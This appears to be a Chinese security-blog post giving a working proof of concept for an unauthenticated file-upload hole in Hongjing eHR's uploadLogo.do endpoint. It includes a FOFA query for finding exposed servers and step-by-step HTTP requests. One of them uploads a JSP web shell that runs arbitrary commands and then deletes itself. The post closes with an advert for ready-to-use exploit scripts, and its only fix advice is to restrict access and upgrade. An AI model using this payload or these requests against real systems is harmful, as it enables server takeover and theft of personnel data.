#  宏景eHR uploadLogo.do 任意文件上传漏洞   
Superhero  nday POC   2024-11-22 08:16  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
宏景eHR人力资源管理软件是一款专为复杂单组织或多组织客户设计的人力资源管理软件，融合了最新的 互联网技术和先进的人力资源管理理念和实践。宏景eHR软件支持B/S架构，特别适合集团化管理和跨地域使用。它提供了全面的人力资源管理功能，包括人员、组织机构、档案、合同、薪资、保险、绩效、考勤、招聘、培训、干部任免和人事流程等业务的管理，以及人事、绩效、培训、招聘、考勤等业务自助。此外，该软件还具备报表功能和 灵活的表格工具，支持集团管控、目标管理、领导决策等应用。  
  
  
**01******  
  
**漏洞概述**  
  
  
宏景eHR uploadLogo.do 接口存在任意文件上传漏洞，未经身份验证远程攻击者可利用该漏洞代码执行，写入WebShell,进一步控制服务器权限。  
  
  
**02******  
  
**搜索引擎**  
  
  
FOFA:   
```
app="HJSOFT-HCM"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibicPiamIEhziby8iarT7gugVxFgTWzY36Be2ufyyqHib4cmRe9W7SdHiacq2g/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
  
1、获取cookie  
```
GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
Host: 
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibYHzXCJXFCoo6Sb3eM6B8BBSY5WZDDDrRdJ7XyUw6SUVtkn1H0yS2sQ/640?wx_fmt=png&from=appmsg "")  
  
2、携带cookie获取文件上传路径   
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Cookie: 获取到的cookie
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r

------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"


------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

1
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

1
------WebKitFormBoundaryfjKBvGWJbG07Z02r--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYib7a7RQslvzKstQHp6XPmUGuGckKGOjrSvGUMvtXXxxrAd0Ssa6ISZ8g/640?wx_fmt=png&from=appmsg "")  
  
3、上传shell  
```
POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Cookie: 获取到的cookie
Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r

------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="path"

C~3a~5c^66f4^65b0^8865^4e01^524d^5907^4efd~5capache~2dtomcat~2d~39~2e~30~2e~34~33~5cwebapps~5cROOT~5crce.jsp
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="lfType"

0
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="logofile"; filename=""
Content-Type: image/gif

1
------WebKitFormBoundaryfjKBvGWJbG07Z02r
Content-Disposition: form-data; name="twoFile"; filename=""
Content-Type: image/gif

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryfjKBvGWJbG07Z02r--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibN45w7CNNcBt0DZzmzFGtEhgnrZpeHm6rZlCsHTAnajHuagtJqrEdiaw/640?wx_fmt=png&from=appmsg "")  
  
4、访问shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYib9NYUBia8tTHbELrBgWlISmUAEV7nLXuF23icJicprnjToWLTugG3CWBxw/640?wx_fmt=png&from=appmsg "")  
  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibv3tnKS5KSaSNlTSibusv8TUs9r8toTOQxdvo51cHickE36Jj3phnGKDQ/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibRaqzLspNrBZjDU25IlL36qboPHc8ogmNdptoHlicZcBIRMQW9NMeP1w/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLNv7ZfWGDsCMyZyQDQibyYibSrsCcH4GvU1jq1UcwuJ0rubqsbWB2B05TYwKJ9PO1WH6XqlRJFiaaTA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。   
  
2、三款工具都支持内置poc+自写poc目录一起扫描。   
  
3、保持每周更新10-15个poc。   
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
